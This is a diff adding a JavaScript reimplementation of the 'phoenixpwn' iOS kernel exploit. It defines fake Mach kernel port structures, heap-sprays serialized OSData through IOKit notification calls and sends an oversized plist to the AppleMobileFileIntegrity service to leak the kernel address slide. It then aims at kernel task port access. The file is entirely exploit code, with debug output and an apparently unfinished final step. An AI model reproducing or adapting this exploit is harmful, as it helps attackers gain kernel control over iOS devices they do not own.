@@ -1,0 +1,195 @@
+/*
+ *  phoenixpwn kernel exploit
+ *  reimplemented in JS
+ *  greetz to @s1guza, @tihmstar, @i41nbeer, @mbazaliy
+ */
+
+var sanity_port = 0;
+var MACH_PORT_RIGHT_RECEIVE = 0x1;
+var MACH_MSG_TYPE_MAKE_SEND = 0x14;
+var MACH_PORT_LIMITS_INFO = 0x1;
+var MACH_PORT_LIMITS_INFO_COUNT = 0x1;
+var kport_size = 0x78;
+var kport_ip_bits4 = 0x0;
+var kport_ip_references4 = 0x4;
+var kport_ip_lock_type4 = 0x10;
+var kport_ip_messages_port_qlimit2 = 0x42;
+var kport_ip_receiver4 = 0x4c;
+var kport_ip_srights4 = 0x70;
+var KERN_SUCCESS = 0;
+var NULL = 0;
+var MACH_PORT_NULL = 0;
+
+var fakeportData = 0;
+
+var kOSSerializeDictionary      = 0x01000000;
+var kOSSerializeArray           = 0x02000000;
+var kOSSerializeSet             = 0x03000000;
+var kOSSerializeNumber          = 0x04000000;
+var kOSSerializeSymbol          = 0x08000000;
+var kOSSerializeString          = 0x09000000;
+var kOSSerializeData            = 0x0a000000;
+var kOSSerializeBoolean         = 0x0b000000;
+var kOSSerializeObject          = 0x0c000000;
+
+var kOSSerializeTypeMask        = 0x7F000000;
+var kOSSerializeDataMask        = 0x00FFFFFF;
+
+var kOSSerializeEndCollection   = 0x80000000;
+
+var kOSSerializeMagic           = 0x000000d3;
+
+var PROT_READ = 0x1;
+var PROT_WRITE = 0x2;
+var PROT_EXEC = 0x4;
+
+var SIZEOF_BYTES_MSG = 384;
+
+var PORTS_NUM = 1024;
+var PORTS_NUM_PRESPRAY = 100;
+var MIG_MAX = 0x1000;
+var NDR_record = 0x36ebf00c;
+
+function spray_data(mem, size, num, portptr) {
+	var err = malloc(4);
+	var ret = 0;
+	var master = malloc(4);
+	host_get_io_master(mach_host_self(), master);
+	var dict = malloc(MIG_MAX);
+	var __cnt = 0;
+	write_u32(dict + (__cnt << 2), kOSSerializeMagic); __cnt++;
+	write_u32(dict + (__cnt << 2), kOSSerializeEndCollection | kOSSerializeDictionary | 1); __cnt++;
+	write_u32(dict + (__cnt << 2), kOSSerializeSymbol | 4); __cnt++;
+	write_u32(dict + (__cnt << 2), 0x0079656b); __cnt++;
+	write_u32(dict + (__cnt << 2), kOSSerializeEndCollection | kOSSerializeArray | num); __cnt++;
+
+	for (var i = 0; i < num; i++) {
+		if (i == (num - 1)) {
+			write_u32(dict + (__cnt << 2), kOSSerializeEndCollection | kOSSerializeData | SIZEOF_BYTES_MSG); __cnt++;
+		} else {
+			write_u32(dict + (__cnt << 2), kOSSerializeData | SIZEOF_BYTES_MSG); __cnt++;
+		}
+		if (mem != 0 && size != 0) {
+			memcpy(dict + (__cnt << 2), mem, size);
+		}
+		memset(dict + (__cnt << 2) + size, 0, SIZEOF_BYTES_MSG - size);
+		__cnt += SIZEOF_BYTES_MSG / 4;
+	}
+
+	printf("%x %x\n", master, read_u32(master));
+	printf("%x\n", read_u32(0x36ebf00c + get_dyld_shc_slide()));
+	ret = io_service_add_notification_ool(read_u32(master), "IOServiceTerminate", dict, __cnt * 4, MACH_PORT_NULL, NULL, 0, err, portptr);
+	if (ret == KERN_SUCCESS) {
+		ret = read_u32(err);
+	}
+
+	return ret;
+}
+
+function copyinPort(kport, cnt) {
+	var err = malloc(4);
+	var ret = 0;
+	var self = mach_task_self();
+	var service = MACH_PORT_NULL;
+	var client = malloc(4);
+	var it = malloc(4);
+	var o = MACH_PORT_NULL;
+	var data = malloc(4);
+	var master = malloc(4);
+	fakeportData = malloc(4);
+	host_get_io_master(mach_host_self(), master);
+	ret = spray_data(NULL, 0, 5, data);
+	printf("spray_data=%d (%s)\n", ret, mach_error_string(ret));
+	printf("sprayed, still here\n");
+	printf("still alive 100\n");
+
+	service = IOServiceGetMatchingService(read_u32(master), IOServiceMatching("AppleMobileFileIntegrity"));
+	printf("service=%x\n", service);
+	printf("still alive 104\n");
+
+	var tst = sptr("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+	var kpbuf = tst + 4;
+	for (var i = 0; i < cnt; i++) {
+		write_buf(kpbuf + (i * kport_size), read_buf(kport + (i * kport_size), kport_size), kport_size);
+	}
+	printf("still alive 111\n");
+
+	var err = malloc(4);
+	printf("still alive 114\n");
+	var xml = sptr("<plist><dict><key>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</key><integer size=\"512\">1768515945</integer></dict></plist>");
+	printf("still alive 116\n");
+	ret = io_service_open_extended(service, self, 0, 0, 1, xml, strlen(xml) + 1, err, client);
+	printf("still alive 118\n");
+	printf("io_service_open_extended=%d (%s)\n", ret, mach_error_string(ret));
+	printf("still alive 120\n");
+	if (ret == KERN_SUCCESS) {
+		ret = read_u32(err);
+	}
+	printf("still alive 124\n");
+	printf("io_service_open_extended=%d (%s)\n", ret, mach_error_string(ret));
+	printf("still alive 126\n");
+	IORegistryEntryGetChildIterator(service, "IOService", it);
+	printf("still alive 128\n");
+
+	var found = false;
+
+	while ((o = IOIteratorNext(read_u32(it))) != MACH_PORT_NULL && !found) {
+		printf("still alive 133\n");
+		var buf = malloc(16 * 4);
+		var size = malloc(4);
+		write_u32(size, 16 * 4);
+		ret = IORegistryEntryGetProperty(o, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", buf, size);
+		if (ret == KERN_SUCCESS) {
+			printf("yolo\n");
+			mach_port_deallocate(self, read_u32(data));
+			write_u32(data, MACH_PORT_NULL);
+			spray_data(tst, strlen(tst) + 1, 10, fakeportData);
+			printf("YOLO YOLO YOLO kaslr_slide=0x%08x\n", ((read_u32(buf + (9 << 2)) & 0xfff00000) + 0x1000) - 0x80001000);
+			sleep(1);
+			found = true;
+		}
+	}
+
+}
+
+function get_kernel_task() {
+	var ret = 0;
+	var tfp0 = 0;
+
+	sanity_port = malloc(4);
+
+	mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, sanity_port);
+	mach_port_insert_right(mach_task_self(), read_u32(sanity_port), read_u32(sanity_port), MACH_MSG_TYPE_MAKE_SEND);
+	limits = malloc(4);
+	write_u32(limits, 1000);
+	mach_port_set_attributes(mach_task_self(), read_u32(sanity_port), MACH_PORT_LIMITS_INFO, limits, MACH_PORT_LIMITS_INFO_COUNT);
+
+	printf("starting exploit\n");
+
+	var data = malloc(16);
+	var kport = malloc(kport_size * 2);
+	var ptr = kport + kport_size; // maybe + 1? iirc adding 1 to a pointer adds sizeof(type) unless it's void or something
+	write_u32(kport + kport_ip_bits4, 0x80000002); // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
+	write_u32(kport + kport_ip_references4, 100);
+	write_u32(kport + kport_ip_lock_type4, 0x11);
+	write_u16(kport + kport_ip_messages_port_qlimit2, 777);
+	write_u32(kport + kport_ip_receiver4, 0x12345678); // dummy
+	write_u32(kport + kport_ip_srights4, 99);
+
+	var big_buf = malloc(MIG_MAX);
+	var small_buf = malloc(MIG_MAX);
+	
+	var big_size = 0;
+	var small_size = 0;
+
+	var fp = malloc(PORTS_NUM * 4);
+	var postSpray = malloc(4);
+
+	usleep(10000);
+	sched_yield();
+	var kptr = copyinPort(kport, 2);
+
+	printf("get lucky\n");
+
+	return tfp0;
+}
